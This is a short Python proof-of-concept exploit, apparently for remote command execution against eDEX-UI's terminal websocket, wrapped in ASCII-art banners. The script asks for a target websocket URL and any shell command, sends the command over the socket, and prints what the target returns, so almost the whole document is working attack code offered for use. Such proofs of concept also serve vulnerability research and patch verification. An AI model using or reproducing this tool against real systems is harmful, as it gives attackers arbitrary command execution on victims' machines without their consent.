import websocket
import time
import colorama
import os
import sys

os.system('cls' if os.name == 'nt' else 'clear')

print(colorama.Fore.RED+'''
██████╗  ██████╗ ██████╗  ██████╗ ██╗   ██╗
██╔══██╗██╔═══██╗██╔══██╗██╔═══██╗╚██╗ ██╔╝
██████╔╝██║   ██║██████╔╝██║   ██║ ╚████╔╝
██╔═══╝ ██║   ██║██╔══██╗██║   ██║  ╚██╔╝
██║     ╚██████╔╝██║  ██║╚██████╔╝   ██║
╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝
    '''+colorama.Fore.RESET+"\neDEX-UI WebSocket RCE PoC by S0cial-Lain\n")

def ctrl_input(prompt):
    try:
        return input(prompt)
    except KeyboardInterrupt:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(colorama.Fore.RED+"""\n
 ░▒▓██████▓▒ ▒▓████████▓▒ ▒▓███████▓▒░ ▒▓█▓▒░                    ░▒▓██████▓▒░  
░▒▓█▓▒░░▒▓█▓░  ░▒▓█▓▒░    ▒▓█▓▒░░▒▓█▓▒ ▒▓█▓▒░        ▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░        ░▒▓█▓▒░    ▒▓█▓▒░░▒▓█▓▒ ▒▓█▓▒░        ▒▓█▓▒░     ░▒▓█▓▒░        
░▒▓█▓▒░        ░▒▓█▓▒░    ▒▓███████▓▒░ ▒▓█▓▒░     ▓▓█▓▓█▓▓▓█▓   ░▒▓█▓▒░        
░▒▓█▓▒░        ░▒▓█▓▒░    ▒▓█▓▒░░▒▓█▓▒ ▒▓█▓▒░        ▒▓█▓▒░     ░▒▓█▓▒░        
░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░    ▒▓█▓▒░░▒▓█▓▒ ▒▓█▓▒░        ▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░ 
 ░▒▓██████▓▒░  ░▒▓█▓▒░    ▒▓█▓▒░░▒▓█▓▒ ▒▓████████▓▒░             ░▒▓██████▓▒░ 
\n"""+colorama.Fore.RESET)
        print(colorama.Fore.RED+" >:O YOU REALLY DID ! >:(\n"+colorama.Fore.RESET)
        sys.exit(1)

try:
    ws_url = ctrl_input("Target Websocket (e.g ws://localhost:3000) : ")
    cmd = ctrl_input("Command To Send : ")
    ws = websocket.create_connection(ws_url)
    print("Present day, Present Time...")
    
    def read_output(timeout=3):
        start_time = time.time()
        output = ""
        ws.settimeout(0.1)
        while time.time() - start_time < timeout:
            try:
                message = ws.recv()
                print(f"{message}", end='')
                output += message
            except websocket.WebSocketTimeoutException:
                continue
            except:
                break
        return output
    
    print(f"Sending: {cmd}")
    ws.send(cmd + '\r')
    
    print("Capturing output...")
    output = read_output(3)
    
    print(f"\nCaptured output: {len(output)} characters")
    ws.close()
    print("Done!")
    exit()

except KeyboardInterrupt:
    print("\nInterrompted by user. Exiting...")
    exit()
except Exception as e:
    print(f"Error: {e}")